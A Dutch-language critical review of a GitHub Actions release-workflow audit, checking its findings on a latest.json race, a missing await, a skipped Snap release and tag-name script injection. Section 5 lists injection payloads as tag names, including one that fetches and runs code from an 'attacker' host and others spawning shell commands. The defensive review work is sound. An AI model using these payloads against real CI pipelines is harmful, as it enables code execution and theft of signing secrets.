# Hyperkritische review — workflow-auditrapport

Het rapport is **fundamenteel gezond maar niet betrouwbaar in de details**: de structurele diagnoses kloppen bijna allemaal, maar de twee bevindingen die het zélf op plek 1 en 2 zet zijn respectievelijk overdreven en feitelijk verkeerd onderbouwd — en de meest concrete, aantoonbaar *al opgetreden* releasefout mist het volledig.

## 1. [BEVESTIGD] Prioriteit 2 (`release.yml:268`, ontbrekende `await`) beschrijft een faalmodus die onder Node 22 niet bestaat

De wrapper van `actions/github-script` (`src/main.ts`, main) roept **geen** `process.exit()` aan en doet `await callAsyncFunction(...)`. Het proces blijft dus leven zolang de socket open staat. Nagespeeld op Node v22.22.2 (de versie die de workflow zelf pint):

```
Error: HttpError: 404 updateRelease → EXITCODE=1
step body klaar, proces leeft nog → HttpError 422 → EXITCODE=1
```

Dus: **rejectie → stap faalt met exit 1** (fataal sinds Node 15); **succes → release wordt gewoon gepubliceerd**. Empirisch bevestigd: run 29723780935, stap "Publish release" 1 seconde, `success`, en v2026.7.11 staat gepubliceerd. De `await` moet er alsnog in (onleesbare stacktrace, volgorde t.o.v. `core.setOutput` niet gegarandeerd), maar dit is **LAAG/MIDDEL**, geen prioriteit 2. `Number(process.env.release_id)` is cosmetica — Octokit interpoleert de string prima.

## 2. [BEVESTIGD] Prioriteit 1 (`latest.json`-race) is technisch correct maar qua ernst opgeblazen

De mechaniek klopt, en beter dan het rapport laat zien: `src/upload-version-json.ts` op de gepinde tag `action-v0.6.1` doet listReleaseAssets → download → `platforms` overnemen → schrijven → delete → upload. Geen lock, geen ETag. Klassieke lost update.

Maar de raamgrootte is klein: uit run 29723780935 eindigt ubuntu's build om 07:18:26, macOS om 07:19:29 — **63 seconden uit elkaar**, tegen een RMW-venster van seconden. En `latest.json` van v2026.7.12 bevat alle tien platformsleutels. Deze bug heeft nog nooit toegeslagen.

**Wel belangrijk:** `max-parallel: 1` werkt — maar **alleen** omdat tauri-action `platforms` *merget* in plaats van overschrijft. Was het een overwrite geweest, dan had de fix niets opgelost. Die load-bearing aanname is niet gecontroleerd door de auteur.

## 3. [BEVESTIGD] Volledig gemist: v2026.7.12 heeft géén Snap, en de tag wijst naar de verkeerde commit

De scherpste echte fout in de hele CI, en er staat geen woord over in het rapport:
- `release.yml` run #24 (id 29988354936) is een **`workflow_dispatch` op `main`**, geen tag-push. Zo is v2026.7.12 uitgebracht.
- Release-API voor `v2026.7.12`: `target_commitish: main`, 14 assets (latest.json, rpm, AppImage, deb, dmg, exe, nsis.zip, app.tar.gz + sigs). **Geen enkel `.snap`.**
- `snap.yml` heeft voor v2026.7.12 **geen enkele run**; de laatste is #20 voor v2026.7.11.
- Oorzaak: het draft-release werd gepubliceerd door `GITHUB_TOKEN`, dus GitHub maakte de tag zonder `push`-event — tokengedreven events triggeren geen workflows. `snap.yml` hangt uitsluitend aan `push: tags: v*`.
- De tag `v2026.7.12` wijst naar `65961b1 perf(state): undo-snapshot…`, **niet** naar de bumpcommit `bacfa72 chore(release): v2026.7.12`.

Precies de klasse "stille release-faalmodus" die het rapport claimt te dekken — maar alleen de hypothetische variant staat erin, niet de variant die vorige week echt gebeurde.

## 4. [BEVESTIGD] O1 telt zes injectieplaatsen; er zijn er zeven
De tabel noemt zes; sectie 4 noemt voor snap.yml er vier (`:30,45,68,81`) — regel 81 (`gh release upload "${{ …version }}"`) ontbreekt in de tabel. Totaal: `release.yml:30,40,158` + `snap.yml:30,45,68,81`. Een audit waarvan de kopregel niet met zijn eigen secties overeenkomt is niet af.

## 5. [BEVESTIGD] De PoC-tag in O1 is geen geldige git-tagnaam
`git check-ref-format` getest: `v1.0$(curl attacker/x|iex)` is **INVALID** (spatie), net als `:`-varianten en `//`. Wel geldig: `v1.0$(id)`, `v1.0$(iex(iwr(x)))`, `v1.0";whoami;"`, `v1.0'quote`, `v1.0');process.exit(0);`, `v1.0'+require('child_process').execSync('id')+'`. De **klasse** blijft dus volledig overeind (`'`, `"`, `` ` ``, `$`, `(`, `)`, `;`, `|`, `&`, `/` zijn toegestaan), maar de payload met URL is lastig (geen `http://`). Belangrijker: de `workflow_dispatch`-route kent **geen enkele** tekenbeperking — en dat is de route die in de praktijk gebruikt wordt (zie punt 3). Dat onderscheid ontbreekt.

De pwsh-claim zelf is correct: `$( )` binnen een double-quoted PowerShell-string wordt geëvalueerd. [BEVESTIGD op leesniveau; geen pwsh in deze omgeving.]

## 6. [BEVESTIGD] O1 overdrijft de secret-blootstelling; snap.yml heeft nu geen te stelen secret
`release.yml:30/:40` zitten in `create-release` met alleen `GITHUB_TOKEN` — geen signing key. Alleen `:158` zit in de job met signing key + Azure. En voor snap: in run 88292178496 is "Publish to Snap Store" `skipped` — de `if` eist `env.SNAPCRAFT_STORE_CREDENTIALS != ''`, **het secret is niet gezet**. Dat corrigeert ook sectie 4 punt 1: de volgorde-analyse is correct (snap-run #20 klaar 07:22:47, `publish-release` pas 07:29:15 — 6,5 min eerder), maar de bevinding is **latent, niet actief**. HOOG voor iets dat pas afgaat als iemand het secret toevoegt, zonder dat erbij te zeggen, is misleidend.

## 7. [BEVESTIGD] Sectie 4 punt 11 is gewoon fout
De defaultshell voor `run:` op Linux is `bash -e {0}`. Met `-e` faalt een `grep` die niets vindt de stap direct. De voorgestelde `grep -q … || exit 1` is een no-op die alleen nuttige console-output weggooit. Ironisch: bij punt 8 heeft de auteur diezelfde `-e`/pipefail-nuance wél correct.

## 8. [BEVESTIGD] Gemist: de comment op `release.yml:230-233` is verouderd
Hij zegt dat build-windows' eigen tauri-action ook een `latest.json` merget — maar regel 134 zet `includeUpdaterJson: false`. In een bestand waarvan de comments het institutionele geheugen zijn, is een comment die het tegenovergestelde beschrijft precies de valstrik die de volgende storing veroorzaakt. Het rapport prijst de comments en controleert ze niet.

## 9. [BEVESTIGD] O4-tabel: kolom "Ziet secrets?" is intern inconsistent
`dtolnay/rust-toolchain` krijgt "ja", maar `actions/checkout`/`setup-node` krijgen "—" terwijl ze in dezelfde jobs onder hetzelfde job-level `env:` draaien. Job-level env geldt ook voor action-stappen.

De onderliggende claim klopt: **`dtolnay/rust-toolchain@stable` is een branch** — API geeft 200, SHA `4cda84d…`, commit "toolchain: stable" van 16 juli 2026. Bewegend, niet een tag die zo heet. "De slechtste" is wat willekeurig (`@v1`/`@v4`/`@v5` zijn even herschrijfbaar); het echte verschil is dat `stable` per Rust-release verschuift.

## 10. [BEVESTIGD] `live.yml` — alle drie de zware kloppen, en beter dan onderbouwd
De aangeroepen workflow deployt met **`rsync -az --delete`**, niet-atomisch, geen symlink-swap — een afgebroken run laat dus letterlijk een halve site achter (deletes toegepast, nieuwe bestanden incompleet). Het rapport stelt dit zonder de aangeroepen workflow te openen; het gokte goed. De `@main`-pin met `deploy_ssh_key` en de ontbrekende CI-koppeling kloppen letterlijk.

## 11. [BEVESTIGD] Overige nagelopen claims die kloppen
Dode universal-targets (CI valideert de universal-build nooit); `npm install` vs `npm ci`; esbuild-output onderdrukt in `run.sh` (compile-fout = exit 1 zonder diagnose); CLAUDE.md noemt de `test`-job niet; geen dependabot/SECURITY/templates; geen caching; `DutchSailor` vs `@Nozzit`. Ook `$PSNativeCommandUseErrorActionPreference` is per Microsoft-docs default `$false` — punt 6 terecht.

**Wel te scherp:** de runner plakt voor `pwsh` `exit $LASTEXITCODE` aan, waardoor de *laatste* native command (regel 250) de stap wél laat falen. Het echte gat zit bij **regel 208** (`gh release upload` van zip+sig): faalt die stil, dan schrijft de stap een `latest.json` met een URL naar een nooit-geüploade asset → kapotte Windows-updater, groene run. Dát is de zin die er had moeten staan.

## 12. [VERMOED · midden] O2's "niet-reproduceerbaar" is te sterk
`npm install` met een consistente lockfile installeert de gelockte versies; drift ontstaat pas bij divergentie. Gevolg (a) — CI valideert de lock niet — is hard; gevolg (b) is een risico, geen zekerheid.

## Kon ik niet controleren
`shell: pwsh`-gedrag empirisch (geen PowerShell in de container); of `libappindicator3-dev` echt ontbreekt op ubuntu-24.04; de precieze breedte van het RMW-venster; of tag-protection de injectie via tagnaam blokkeert (repo-settings niet leesbaar; de dispatch-route is hoe dan ook onbeperkt); of `gh release view` op een draft een gegarandeerd contract is.

## Oordeel: **Nee — niet in deze vorm**
Het skelet is bruikbaar en de meeste diagnoses houden stand, maar de prioriteitslijst stuurt de lezer verkeerd: nummer 2 beschrijft een faalmodus die niet optreedt, nummer 1 is een bug die in 24 releases nooit is afgegaan, en de release die er nú staat mist zijn Snap-pakket zonder dat het rapport dat opmerkt.

**Minimaal vereist:** (1) `release.yml:268` herschrijven en downgraden; (2) **de dispatch-release-gap toevoegen als eigen HOGE bevinding** met het bewijs (run 24 = dispatch, geen `.snap`, geen snap-run, tag op `65961b1` i.p.v. `bacfa72`); (3) de `latest.json`-race herwaarderen naar MIDDEL mét meetgegevens én de merge-aanname onder `max-parallel: 1` expliciet maken; (4) O1 rechttrekken (zeven locaties, tabel synchroon, geldige PoC-tag, per locatie de werkelijke secrets); (5) sectie 4 punt 11 schrappen en punt 6 aanscherpen naar regel 208; (6) de verouderde comment op `:230-233` opnemen en de O4-kolom corrigeren; (7) snap-punt 1 als latent markeren.

De terechte kern — injectieklasse, ontbrekende testpoort vóór een onomkeerbare release, ontbrekende tag↔versie-verificatie, `live.yml` op `@main` met `cancel-in-progress: true` boven een `rsync --delete` — mag blijven staan.
